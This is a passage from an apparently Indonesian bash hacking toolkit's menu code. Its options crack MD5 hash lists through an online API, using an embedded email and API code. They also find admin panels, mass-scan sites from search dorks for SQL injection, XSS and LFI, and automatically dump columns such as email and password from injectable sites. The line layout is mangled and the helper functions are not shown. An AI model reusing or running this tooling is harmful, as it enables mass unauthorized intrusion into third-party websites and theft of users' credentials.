                 banner${angkab}                                            echo -e "                |\033[7;32m md5 decryptor ${N}|\n"                                                           read -p "[+] Masukan list md5: " file
                 for hash in `cat $file`                                    do                                                         dec=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728")
                 if [ "$dec" = "" ];then                                       echo "[?] Not Cracked: ${hash} "
                 else [ "$dec" = "[[:punct:][:alnum:]]*" ]
                     echo "$dec" >> cracked-$list.txt                           echo "[!] Cracked: ${hash} $del $dec"                  fi
                 done
                 read -p "Press Enter for continue " aswkxkkxk                                                                         menu                                                       ;;                                                         *) clear;menu;;
                 esac                                              ;;
        3) clear
           banner${angkab}                                            echo -e "                |\033[7;32m md5 emil pass decrytor ${N}|\n"
           hashmail
           menu
          ;;                                                       *) clear;menu;;                                          esac                                                                                                               ;;
   11) clear                                                     banner${angkab}                                            gen                                                        menu                                                    ;;                                                         12) clear                                                     banner${angkab}                                            echo -e "                   |\033[7;32m ADMIN FINDER ${N}|\n"                                                         echo -e "[${G}1${N}]. biasa"                               echo -e "[${G}2${N}]. masal"
      echo -ne "[${R}?${N}] yg mana ?? "
      read p
      case $p in
      1) clear
      banner${angkab}                                            echo -e "                   |\033[7;32m ADMIN FINDER ${N}|\n"                                                         read -p "site: " site                                      adminfin                                                   menu                                                       ;;                                                         2) clear                                                   banner${angkab}                                            echo -e "                   |\033[7;32m ADMIN FINDER MASAL ${N}|\n"                                                   read -p "site list: " list                                 for site in `cat $list 2>/dev/null | sed 's/\r$//' | tr -d "\0"`                                                      do                                                            adminfin
      done
      menu                                                       ;;                                                         *) echo -e "${N}[${G}+${N}] Thx for using this tools";;                                                               esac                                                    ;;                                                         13)  clear                                                    banner${angkab}                                            echo -e "          |\033[7;32m Psqli Sqli/Xss/LFI/AdminFinder Scanner ${N}|\n"
      echo -e "[${G}1${N}]. biasa"                               echo -e "[${G}2${N}]. masal"                               echo -ne "[${R}?${N}] yg mana ?? "                         read p                                                     case $p in                                                 1)
      hekel="y"                                                  clear                                                      banner${angkab}                                            echo -e "          |\033[7;32m Psqli Sqli/Xss/LFI/AdminFinder Scanner ${N}|\n"
      read -p "site: " site                                      dork=".php%3Fid%3D+site%3a$site"                           pa="1"                                                     rm -rf .result_dork .not .url .vuln .bad .wp .live         trap break INT                                             dora #$result_vuln                                         trap - INT                                                 echo -e "${N}[${R}+${N}] Done.....\n[${G}+${N}] Result found saved ${G}output/$dir/${N}"                              echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat .live 2>/dev/null | wc -l) Login page${N}"
      echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat .wp 2>/dev/null | wc -l) WordPress${N}"                          echo -e "[${R}!${N}] Result Total : ${R}\033[2m$(cat .bad 2>/dev/null | wc -l) Not found${N}"
      echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat output/$dir/inject_point.txt 2>/dev/null | wc -l) Sqli vuln${N}"                                                            echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat output/$dir/lfi.txt 2>/dev/null | wc -l) LFI${N}"
      echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat output/$dir/xss.txt 2>/dev/null | wc -l) xss${N}"               menu                                                       ;;
      2)                                                         hekel="y"                                                  clear
      banner${angkab}
      echo -e "          |\033[7;32m Psqli Sqli/Xss/LFI/AdminFinder Scanner masal ${N}|\n"                                  read -p "site list: " list
      rm -rf .result_dork .not .url .vuln .bad .wp .live
      trap break INT
      for site in $(cat $list 2>/dev/null | sed 's/\r$//' | tr -d "\0" );do
      dork=".php%3Fid%3D+site%3a$site"
      pa="1"                                                     dora #$result_vuln
      echo -e "${N}[${R}+${N}] Done.....\n[${G}+${N}] Result found saved ${G}output/$dir/${N}"                              echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat .live 2>/dev/null | wc -l) Login page${N}"                       echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat .wp 2>/dev/null | wc -l) WordPress${N}"
      echo -e "[${R}!${N}] Result Total : ${R}\033[2m$(cat .bad 2>/dev/null | wc -l) Not found${N}"
      echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat output/$dir/inject_point.txt 2>/dev/null | wc -l) Sqli vuln${N}"                                                            echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat output/$dir/lfi.txt 2>/dev/null | wc -l) LFI${N}"                echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat output/$dir/xss.txt 2>/dev/null | wc -l) xss${N}"               done
      trap - INT                                                 menu
      ;;                                                         *) echo -e "${N}[${G}+${N}] Thx for using this tools";;
      esac                                                    ;;
   14)
      boot_empas="y"                                             masn="y"
     dump_name="n"                                              hekel="n"
     clear
     banner${angkab}                                            echo -e "              |\033[7;32m aUTO DorKiNg + AutO Dump ${N}|\n"                                                  echo -e "[${O}1${N}]. dorking biasa"
      echo -e "[${O}2${N}]. dorking masal"                       echo -e "[${O}3${N}]. kembali ke menu utama"               echo -ne "[${R}?${N}] yg mana ?? "                         read d                                                     case $d in                                                  1) masn="y"
          dump_name="n"                                              dms="n"                                                    clear                                                      banner${angkab}
          echo -e "              |\033[7;32m aUTO DorKiNg + AutO Dump ${N}|\n"                                                  echo -ne "[${O}+${N}] Dork sqli: ${O}"                     read do
          echo -e "${N}\033[2mexample: email|mail|pass|pssw"
          echo -ne "${N}[${O}+${N}] Dump: ${O}"
          read auto_get                                              echo -en "${N}[${R}+${N}] page: ${G}";read pa              rm -rf .result_dork .not .url .vuln .bad .wp .live                                                                    dork=$(echo "$do" | sed 's/ /+/g')                         trap break INT
          dora #$result_vuln                                         trap - INT
          echo -e "${N}[${R}*${N}] Done.....\n[${G}+${N}] Result vuln sqli saved ${G}$result_vuln${N}"
          echo -e "[${O}+${N}] Result Total : ${G}\033[2m$(cat .result_dork 2>/dev/null | wc -l) site${N}"                      echo -e "[${G}*${N}] Result Total : ${O}\033[2m$(cat .vuln 2>/dev/null | wc -l) Sqli vuln${N}"                        echo -e "[${O}!${N}] Result Total : ${R}\033[2m$(cat .not 2>/dev/null | wc -l) Site not vuln${N}"
          echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat .url 2>/dev/null | wc -l) Url parser${N}"                       echo -e "${N}\033[2mgunakan ctrl+c saat order by untuk skip ke site selanjut nya${N}"
          trap break 2 INT
          masn="y"
          dump_name="n"                                              for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
             do
              waff="n"
              dump_name="n"
              union="$union1"
              if echo "$site" | grep -Po "&" >/dev/null
                       then                                                          echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${G}\033[2mdouble parameter found"                                rm -rf .var .var2
                          asq=$(echo $site | grep -ao ".[^&]*" | head -1)                                                                       eq=$(echo $site | grep -ao ".[^&]*" | wc -l)
                          echo "$asq" >> .var
                          for iq in `seq 2 $eq`
                          do
                            var1=$(cut -d "&" -f$iq <<< $site)
                            echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${O}\033[2minjecting parameter $var1${N}"
                            echo -ne "$var1&" >> .var2                                 echo "$asq&`cat .var2`" | sed s/'&$'// >> .var
                          done                                                       for site in `cat .var`
                          do                                                            sqli
                          done
                       else
                          sqli                                                    fi
          done                                                       trap - INT
          rm -rf .vuln                                               menu                                                     ;;
        2) masn="y"
          dump_name="n"
          dms="y"
          clear
          banner${angkab}                                            echo -e "              |\033[7;32m aUTO DorKiNg + AutO Get Dump${N}|\n"
          echo -ne "[${O}+${N}] Dork sqli list: ${O}"                read do
          echo -e "${N}\033[2mexample: email|mail|pass|pssw"
          echo -ne "${N}[${O}+${N}] Dump: ${O}"
          read auto_get                                              echo -en "${N}[${R}+${N}] page: ${G}";read pa
          rm -rf .result_dork .not .url .vuln .bad .wp .live
          dor=$(cat "$do" | sed 's/ /+/g')
          trap break INT                                             for dork in $(echo "$dor")
           do                                                          trap break 2 INT
            dora #$result_vuln
            trap - INT
            echo -e "${N}[${R}*${N}] \033[2m$dork Done.....\n[${G}+${N}] Result vuln sqli saved ${G}$result_vuln${N}"             echo -e "[${O}+${N}] Result Total : ${G}\033[2m$(cat .result_dork 2>/dev/null | wc -l) site${N}"                      echo -e "[${G}*${N}] Result Total : ${O}\033[2m$(cat .vuln 2>/dev/null | wc -l) Sqli vuln${N}"
            echo -e "[${O}!${N}] Result Total : ${R}\033[2m$(cat .not 2>/dev/null | wc -l) Site not vuln${N}"                     echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat .url 2>/dev/null | wc -l) Url parser${N}"
          done                                                       trap - INT
          echo -e "${N}\033[2mgunakan ctrl+c saat order by untuk skip ke site selanjut nya${N}"                                 trap break 2 INT
          masn="y"
          dump_name="n"                                              for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
             do
              waff="n"                                                   dump_name="n"                                              union="$union1"                                            if echo "$site" | grep -Po "&" >/dev/null                           then                                                          echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${G}\033[2mdouble parameter found"
                          rm -rf .var .var2
                          asq=$(echo $site | grep -ao ".[^&]*" | head -1)
                          eq=$(echo $site | grep -ao ".[^&]*" | wc -l)                                                                          echo "$asq" >> .var
                          for iq in `seq 2 $eq`
                          do
                            var1=$(cut -d "&" -f$iq <<< $site)
                            echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${O}\033[2minjecting parameter $var1${N}"
                            echo -ne "$var1&" >> .var2                                 echo "$asq&`cat .var2`" | sed s/'&$'// >> .var
                          done
                          for site in `cat .var`                                     do                                                            sqli                                                    done                                                    else                                                          sqli                                                    fi
          done                                                       trap - INT                                                 rm -rf .vuln                                               menu
       ;;
         *) echo -e "${N}[${G}+${N}] Thx for using this tools";;
         esac                                                 ;;
   15) bysqli                                                 ;;                                                         16) clear                                                      cxsec                                                  ;;                                                         17) echo -e "${G}c o m i n g   s o o n${N}"                ;;                                                         18) mulai
   ;;                                                         *) echo -e "${N}[${G}+${N}] Thx for using this tools";; esac                                                       }                                                          menu
